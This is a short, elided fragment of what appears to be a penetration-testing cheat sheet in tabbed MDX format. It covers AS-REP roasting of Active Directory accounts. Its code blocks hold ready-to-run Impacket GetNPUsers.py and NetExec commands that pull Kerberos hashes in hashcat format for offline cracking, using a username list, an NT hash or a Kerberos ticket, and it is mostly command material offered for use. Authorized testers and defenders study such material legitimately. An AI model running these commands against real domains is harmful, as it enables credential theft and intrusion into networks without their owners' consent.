...
<Tabs>
  <Tab title="No Creds (username list)">
    ...
    GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass \
      -usersfile users.txt -format hashcat -outputfile hashes.txt
  ...
  <Tab title="Password">
    ```bash wrap
    # Auto-discovers AS-REP roastable accounts
  ...
  <Tab title="NT Hash">
    ```bash wrap
    GetNPUsers.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP \
      -request -format hashcat -outputfile hashes.txt

    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
    ```
  </Tab>
  <Tab title="Kerberos">
    ```bash wrap
    export KRB5CCNAME=/tmp/ticket.ccache
    GetNPUsers.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP \
      -request -format hashcat -outputfile hashes.txt
    ```
  </Tab>
